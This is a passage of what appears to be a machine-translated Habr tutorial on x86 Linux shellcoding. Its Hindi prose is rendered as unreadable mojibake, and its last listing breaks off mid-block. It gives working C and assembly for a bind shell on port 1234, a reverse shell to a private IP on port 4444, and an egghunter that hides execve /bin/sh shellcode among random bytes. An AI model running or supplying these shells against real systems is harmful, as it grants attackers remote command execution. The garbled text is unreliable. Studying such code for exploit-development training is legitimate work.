<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
    <span class="hljs-keyword">int</span> clientfd, sockfd;
    <span class="hljs-keyword">int</span> port = <span class="hljs-number">1234</span>;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">mysockaddr</span>;</span><font></font>
<font></font>
    <span class="hljs-comment">// AF_INET - IPv4, SOCK_STREAM - TCP, 0 - most suitable protocol</span>
    <span class="hljs-comment">// AF_INET = 2, SOCK_STREAM = 1</span>
    <span class="hljs-comment">// create socket, save socket file descriptor in sockfd variable</span>
    sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<font></font>
<font></font>
    <span class="hljs-comment">// fill structure</span>
    mysockaddr.sin_family = AF_INET; <span class="hljs-comment">// can be represented in numeric as 2</span><font></font>
    mysockaddr.sin_port = htons(port);<font></font>
    <span class="hljs-comment">//mysockaddr.sin_addr.s_addr = INADDR_ANY;// can be represented in numeric as 0 which means to bind to all interfaces</span>
    mysockaddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">"192.168.0.106"</span>);
    <span class="hljs-comment">// size of this array is 16 bytes</span>
    <span class="hljs-comment">//printf("size of mysockaddr: %lu\n", sizeof(mysockaddr));</span>
    <span class="hljs-comment">// executing bind() call</span>
    bind(sockfd, (struct sockaddr *) &amp;mysockaddr;, <span class="hljs-keyword">sizeof</span>(mysockaddr));
    <span class="hljs-comment">// listen()</span>
    listen(sockfd, <span class="hljs-number">1</span>);
    <span class="hljs-comment">// accept()</span>
    clientfd = accept(sockfd, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-comment">// duplicate standard file descriptors in client file descriptor</span>
    dup2(clientfd, <span class="hljs-number">0</span>);<font></font>
    dup2(clientfd, <span class="hljs-number">1</span>);<font></font>
    dup2(clientfd, <span class="hljs-number">2</span>);
    <span class="hljs-comment">// and last: execute /bin/sh. All input and ouput of /bin/sh will translated via TCP connection</span>
    <span class="hljs-keyword">char</span> * <span class="hljs-keyword">const</span> argv[] = {<span class="hljs-string">"sh"</span>,<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>};<font></font>
    execve(<span class="hljs-string">"/bin/sh"</span>, argv, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдХреЛрдб рдХреЛ рд╣рдорд╛рд░реЗ рдХреЛрдб рдХреЛ рдкреЛрд░реНрдЯ рдХрд░рдиреЗ рдХрд╛ рд╕рдордпред </font><font style="vertical-align: inherit;">рдпрд╣ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдХреЙрд▓ рдХреНрдпрд╛ рддрд░реНрдХ рджреЗрддрд╛ рд╣реИ рдФрд░ рди рдХреЗрд╡рд▓ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рдЖрдк рдЙрдиреНрд╣реЗрдВ рдПрдХ рдЧрд╛рдЗрдб рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: рдЖрджрдореА &lt;рдХреЙрд▓&gt;ред </font><font style="vertical-align: inherit;">рдХрднреА-рдХрднреА рдХрд┐рд╕реА рдПрдХрд▓ рдирд╛рдо рдореЗрдВ рдХрдИ рд╕рдВрджрд░реНрдн рдореИрдиреБрдЕрд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред </font><font style="vertical-align: inherit;">рд╕рднреА рдЙрдкрд▓рдмреНрдз рд╕реВрдЪреА: рдПрдкреНрд░реЛрдкреЛрд╕ &lt;рдХреЙрд▓&gt;ред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЬрд┐рд╕рдХреЗ рдмрд╛рдж: рдЖрджрдореА &lt;рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдмреНрдпрд╛рдЬ рдХреА рдкреБрд╕реНрддрд┐рдХрд╛ рдХреА рд╕рдВрдЦреНрдпрд╛&gt; &lt;рдХреЙрд▓&gt;ред </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
рд╣рдо </font><b><font style="vertical-align: inherit;">рд░рдЬрд┐рд╕реНрдЯрд░ рддреИрдпрд╛рд░ рдХрд░рддреЗ рд╣реИрдВред</font></b><font style="vertical-align: inherit;"> рд╣рдо рдЙрди рдореВрд▓реНрдпреЛрдВ рдХреЛ рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реИрдВ рдЬреЛ рд╣рдорд╛рд░реЗ рд╕рд╛рде рдХрд╛рдо рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░реЛрдВ рдореЗрдВ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЗрд╕реЗ рд░реАрд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	xor eax, eax<font></font>
	xor ebx, ebx<font></font>
	xor esi, esi</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. рд╕реЙрдХреЗрдЯ рдмрдирд╛рдПрдВ</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
x86 рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдореЗрдВ, рд╕реЙрдХреЗрдЯ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕реАрдзрд╛ рдХреЙрд▓ рдирд╣реАрдВ рд╣реИ ()ред </font><font style="vertical-align: inherit;">рд╕рднреА рдХреЙрд▓реЛрдВ рдХреЛ рдкрд░реЛрдХреНрд╖ рд░реВрдк рд╕реЗ рд╕реЙрдХреЗрдЯрд╕реЗрд▓ () рд╡рд┐рдзрд┐ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред </font><font style="vertical-align: inherit;">рдпрд╣ рдХреЙрд▓ 2 рддрд░реНрдХ рд▓реЗрддрд╛ рд╣реИ: рд╕реЙрдХреЗрдЯ рдХреЙрд▓ рдирдВрдмрд░ рдФрд░ рдЗрд╕рдХреЗ рддрд░реНрдХреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реВрдЪрдХред </font><font style="vertical-align: inherit;">рд╕рдВрднрд╛рд╡рд┐рдд рд╕реЙрдХреЗрдЯ рдХреЙрд▓ рдХреА рдПрдХ рд╕реВрдЪреА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИ: /usr/include/linux/net.h</font></font><br>
<br>
<pre><code class="plaintext hljs">	; creating socket. 3 args<font></font>
	push esi	; 3rd arg, choose default proto<font></font>
	push 0x1	; 2nd arg, 1 equal SOCK_STREAM, TCP<font></font>
	push 0x2	; 1st arg, 2 means Internet family proto<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102	; socketcall<font></font>
	mov bl, 1	; 1 = socket()<font></font>
	mov ecx, esp	; pointer to args of socket()<font></font>
	int 0x80<font></font>
	; in eax socket file descriptor. Save it<font></font>
	mov edx, eax</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. рдирд┐рд░реНрдорд┐рдд рд╕реЙрдХреЗрдЯ рдХреЗ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ рдФрд░ рдмрд╛рдЗрдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ ()ред </font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдиреАрдЪреЗ рджреА рдЧрдИ рдЫрд╡рд┐ рдмрддрд╛рддреА рд╣реИ рдХрд┐ рд╕реНрдЯреИрдХ рдкрд░ рд╕реЙрдХреЗрдЯ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЛ рдХреИрд╕реЗ рдзрдХреЗрд▓рдирд╛ рд╣реИред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдореБрдЭреЗ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕рдордп рдмрд┐рддрд╛рдирд╛ рдкрдбрд╝рд╛ рдХрд┐ рд╕реЙрдХреЗрдЯ рдХреЗ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рдХрд┐рд╕ рд░реВрдк рдореЗрдВ рд░рдЦрд╛ рдЧрдпрд╛ рд╣реИ:</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wg/zx/xb/wgzxxblapjjafqugqngl61pc_7y.png" alt="рдЫрд╡рд┐"><br>
<br>
<pre><code class="plaintext hljs">	; creating sockaddr_in addr struct for bind<font></font>
	push esi		; address, 0 - all interfaces<font></font>
	push WORD 0xd204	; port 1234.<font></font>
	push WORD 2		; AF_INET<font></font>
	mov ecx, esp		; pointer to sockaddr_in struct<font></font>
	push 0x16		; size of struct<font></font>
	push ecx		; pushing pointer to struct<font></font>
	push edx		; pushing socket descriptor<font></font>
	; socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 2		; bind()<font></font>
	mov ecx, esp<font></font>
	int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкреЛрд░реНрдЯ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдХрдорд╛рдВрдб рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 -c "import socket; print(hex(socket.htons(&lt;int:port&gt;)))"
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдФрд░ рдпрджрд┐ рдЖрдк рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрддрд╛ рдмрддрд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬрд┐рд╕ рдкрд░ рд╣рдорд╛рд░рд╛ рд╕реЙрдХреЗрдЯ рд╕реБрдиреЗрдВрдЧреЗ:</font></font><br>
<br>
<pre><code class="plaintext hljs">$python3 -c 'import ipaddress; d = hex(int(ipaddress.IPv4Address("&lt;IPv4 address&gt;"))); print("0x"+"".join([d[i:i+2] for i in range(0,len(d),2)][1:][::-1]))'</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. рдХреЙрд▓ рд╕реБрдиреЛ ()</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; creating listen<font></font>
	push 1<font></font>
	push edx<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 4		; listen()<font></font>
	mov ecx, esp<font></font>
	int 0x80</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. рдХреЙрд▓ рд╕реНрд╡реАрдХрд╛рд░ ()</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; creating accept()<font></font>
	push esi<font></font>
	push esi<font></font>
	push edx<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 5		; accept()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	mov edx, eax		; saving client file descriptor</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. рдорд╛рдирдХ рд╡рд┐рд╡рд░рдгрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХрд░реЗрдВред</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx<font></font>
	mov cl, 3<font></font>
	mov ebx, edx<font></font>
dup:	dec ecx<font></font>
	mov al, 63<font></font>
	int 0x80<font></font>
	jns dup</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. рдХрдорд╛рдВрдб рд╢реЗрд▓ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; execve /bin/sh<font></font>
	xor eax, eax<font></font>
	push eax<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp<font></font>
        push eax<font></font>
        mov edx, esp<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЕрдм рдЗрд╕реЗ рд╕рдм рдПрдХ рд╕рд╛рде рд░рдЦ рджреЗрдВ</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; clear registers<font></font>
	xor eax, eax<font></font>
	xor ebx, ebx<font></font>
	xor esi, esi<font></font>
	; creating socket. 3 args<font></font>
	push esi	; 3rd arg, choose default proto<font></font>
	push 0x1	; 2nd arg, 1 equal SOCK_STREAM, TCP<font></font>
	push 0x2	; 1st arg, 2 means Internet family proto<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102	; socketcall<font></font>
	mov bl, 1	; 1 = socket()<font></font>
	mov ecx, esp	; pointer to args of socket()<font></font>
	int 0x80<font></font>
	; in eax socket file descriptor. Save it<font></font>
	mov edx, eax<font></font>
<font></font>
	; creating sockaddr_in addr struct for bind<font></font>
	push esi		; address, 0 - all interfaces<font></font>
	push WORD 0xd204	; port 1234.<font></font>
	push WORD 2		; AF_INET<font></font>
	mov ecx, esp		; pointer to sockaddr_in struct<font></font>
	push 0x16		; size of struct<font></font>
	push ecx		; pushing pointer to struct<font></font>
	push edx		; pushing socket descriptor<font></font>
	; socketcall<font></font>
	mov al, 102		; socketcall() number<font></font>
	mov bl, 2		; bind()<font></font>
	mov ecx, esp		; 2nd argument - pointer to args<font></font>
	int 0x80<font></font>
<font></font>
	; creating listen<font></font>
	push 1			; listen for 1 client<font></font>
	push edx		; clients queue size<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 4		; listen()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	; creating accept()<font></font>
	push esi		; use default value<font></font>
	push esi		; use default value<font></font>
	push edx		; sockfd<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 5		; accept()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	mov edx, eax		; saving client file descriptor<font></font>
<font></font>
	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx		; clear ecx<font></font>
	mov cl, 3		; number of loops<font></font>
	mov ebx, edx		; socketfd<font></font>
dup:	dec ecx<font></font>
	mov al, 63		; number of dup2 syscall()<font></font>
	int 0x80<font></font>
	jns dup			; repeat for 1,0<font></font>
<font></font>
	; execve /bin/bash<font></font>
	xor eax, eax		; clear eax<font></font>
	push eax		; string terminator<font></font>
	push 0x68732f2f		; //bin/sh<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp		; 1st arg - address of //bin/sh<font></font>
        push eax		; <font></font>
        mov edx, eax		; last argument is zero<font></font>
        push ebx		; 2nd arg - pointer to all args of command<font></font>
        mov ecx, esp		; pointer to args<font></font>
        mov al, 11		; execve syscall number<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЕрдм рд╣рдо рдкреНрд░рд╛рдкреНрдд рд╢реЗрд▓рдХреЛрдб рдХрд╛ рдУрдкрдХреЛрдб рд▓реЗрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рд╣рдорд╛рд░реЗ рд╕реА-рдлрд╝рд╛рдЗрд▓ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд╕рдВрдХрд▓рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЪрд▓рд╛рддреЗ рд╣реИрдВ:</font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/vs/x_/pxvsx_kbwk8cpw6ut9vd0eopjt0.png" alt="рдЫрд╡рд┐"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. рдЯреАрд╕реАрдкреА рд╢реЗрд▓ рдХреЛ рдЙрд▓реНрдЯрд╛ рдХрд░реЗрдВ</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдпрд╣ рдХрд╛рд░реНрдп рдкрд┐рдЫрд▓реЗ рдПрдХ рдХреЗ рд╕рдорд╛рди рд╣реИ, рд╕рд┐рд╡рд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рд╣рдо рдПрдХ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВрдЧреЗред </font><font style="vertical-align: inherit;">рд╕рд╛рдорд╛рдиреНрдп рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо: </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
1. рдПрдХ рд╕реЙрдХреЗрдЯ рдмрдирд╛рдПрдВ; </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2. рдХрдиреЗрдХреНрд╢рди рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗрдЯ рдХрд░реЗрдВ: рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рд╣реЛрд╕реНрдЯ, рдкреЛрд░реНрдЯ; </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
3. рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд╡рд░рдгрдХ; </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
4. рдХрдорд╛рдВрдб рд╢реЗрд▓ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* ip = <span class="hljs-string">"192.168.0.106"</span>;	<span class="hljs-comment">// place your address here</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span><font></font>
<font></font>
    addr.sin_family = AF_INET;<font></font>
    addr.sin_port = htons(<span class="hljs-number">4444</span>);	<span class="hljs-comment">// port</span><font></font>
    inet_aton(ip, &amp;addr;.sin_addr);<font></font>
<font></font>
    <span class="hljs-keyword">int</span> sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<font></font>
    connect(sockfd, (struct sockaddr *)&amp;addr;, <span class="hljs-keyword">sizeof</span>(addr));<font></font>
<font></font>
    <span class="hljs-comment">/* duplicating standard file descriptors */</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<font></font>
    {<font></font>
        dup2(sockfd, i);<font></font>
    }<font></font>
<font></font>
    execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<font></font>
<font></font>
 </code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдо рдХреЛрдбрд╛рдВрддрд░рдХ рдореЗрдВ рдЕрдиреБрд╡рд╛рдж рдХрд░рддреЗ рд╣реИрдВ</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; creating socket<font></font>
	xor eax, eax<font></font>
	xor esi, esi<font></font>
	xor ebx, ebx<font></font>
	push esi<font></font>
	push 0x1<font></font>
	push 0x2<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102<font></font>
	mov bl, 1<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
	mov edx, eax<font></font>
<font></font>
	; creating sockaddr_in and connect()<font></font>
	push esi<font></font>
	push esi<font></font>
	push 0x6a00a8c0		; IPv4 address to connect<font></font>
	push WORD 0x5c11	; port<font></font>
	push WORD 2<font></font>
	mov ecx, esp<font></font>
	push 0x16<font></font>
	push ecx<font></font>
	push edx<font></font>
	; socketcall()<font></font>
	mov al, 102<font></font>
	mov bl, 3		; connect()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx<font></font>
	mov cl, 3<font></font>
	mov ebx, edx<font></font>
dup:	dec ecx<font></font>
	mov al, 63<font></font>
	int 0x80<font></font>
	jns dup<font></font>
<font></font>
	; execve /bin/sh<font></font>
	xor eax, eax<font></font>
	push eax<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp<font></font>
        push eax<font></font>
        mov edx, esp<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдлрд┐рд░:</font></font><br>
<br>
<pre><code class="plaintext hljs">$nasm32 reverse_tcp_shell</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЖрдк рд╕рдорд╛рди рдХрдорд╛рдВрдб (рдХрд╛рд░реНрдп 1) </font><i><font style="vertical-align: inherit;">рдкрд░рд┐рдгрд╛рдо</font></i><font style="vertical-align: inherit;"> рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдиреЗрдХреНрд╢рди рдкрддрд╛ рдпрд╛ рдкреЛрд░реНрдЯ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ</font></font><br>
<i><font style="vertical-align: inherit;"></font></i><br>
<br>
<img src="https://habrastorage.org/webt/cv/dg/cs/cvdgcsad2nttszw7x56-iqnygwy.png" alt="рдЫрд╡рд┐"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. рдПрдЧреБрдирдЧрдВрдЯрд░ рддрдХрдиреАрдХ</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Egghunter рддрдХрдиреАрдХ "рдИрд╕реНрдЯрд░ рдЕрдВрдбреЗ" рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреНрд╖реЗрддреНрд░ рдХреЛ рдпрд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣рдо рдкрд╣рд▓реЗ рд╕реЗ рдЬрд╛рдирддреЗ рд╣реИрдВ, рдФрд░ "рдЕрдВрдбреЗ" рдХреЗ рдмрд╛рдж рдХреЛрдб рдХреЛ рдирд┐рдпрдВрддреНрд░рдг рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВред </font><font style="vertical-align: inherit;">рдпрд╣ рддрдХрдиреАрдХ рддрдм рдЙрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИ рдЬрдм рд╣рдореЗрдВ рдЕрдкрдиреЗ рд╢реЗрд▓рдХреЛрдб рдХрд╛ рд╕рд╣реА рд╕реНрдерд╛рди рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд╣рдордиреЗ рд╕реНрдЯреИрдХ рдкрд░ "рдХрдЪрд░рд╛" рдбрд╛рд▓рд╛;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рд╣рдорд╛рд░реЗ рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рд░рдЦреЗрдВ;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдвреЗрд░ рдкрд░ рдИрд╕реНрдЯрд░ рдЕрдВрдбреЗ рд░рдЦреЛ;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">рдФрд░ рдХрдЪрд░рд╛ рдбрд╛рд▓реЗрдВред</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
"рдХрдЪрд░рд╛" рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ:</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
rdm = bytearray(random.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">96</span>))
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(rdm),<span class="hljs-number">4</span>):<font></font>
	bts = rdm[i:i+<span class="hljs-number">4</span>]<font></font>
	print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">''</span>.join(<span class="hljs-string">'{:02x}'</span>.format(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bts))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рд╣рдо рд╢рдВрдЦ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВрдЧреЗ:</font></font><br>
<br>
<pre><code class="plaintext hljs">	; execve_sh<font></font>
global _start<font></font>
<font></font>
section .text<font></font>
_start:<font></font>
<font></font>
        ; PUSH 0<font></font>
        xor eax, eax<font></font>
        push eax<font></font>
<font></font>
        ; PUSH //bin/sh (8 bytes)<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
<font></font>
        mov ebx, esp<font></font>
<font></font>
        push eax<font></font>
        mov edx, eax<font></font>
<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдЗрд╕ рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рдХрд╛ рдУрдкрдХреЛрдб рд▓реЗрдВ рдФрд░ рд╕реНрдЯреИрдХ рдкрд░ рд░рдЦреЗрдВред </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдо рд╕рдлрд▓ рд╣реЛрдВрдЧреЗ:</font></font><br>
<br>
<pre><code class="plaintext hljs">section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; trash<font></font>
	push 0x94047484<font></font>
	push 0x8c35f24a<font></font>
	push 0x5a449067<font></font>
	push 0xf5a651ed<font></font>
	push 0x7161d058<font></font>
	push 0x3b7b4e10<font></font>
	push 0x9f93c06e<font></font>
	; shellcode execve() /bin/sh<font></font>
	push 0x9080cd0b<font></font>
	push 0xb0e18953<font></font>
	push 0xe28950e3<font></font>
	push 0x896e6962<font></font>
	push 0x2f687361<font></font>
	push 0x622f6868<font></font>
	push 0x6a50c031<font></font>
	; egg<font></font>
	push 0xdeadbeef<font></font>
	; trash<font></font>
        push 0xd213a92d<font></font>
        push 0x9e3a066b<font></font>
        push 0xeb8cb927<font></font>
        push 0xddbaec55<font></font>
        push 0x43a73283<font></font>
        push 0x89f447de<font></font>
        push 0xacfb220f<font></font>
<font></font>
<font></font>
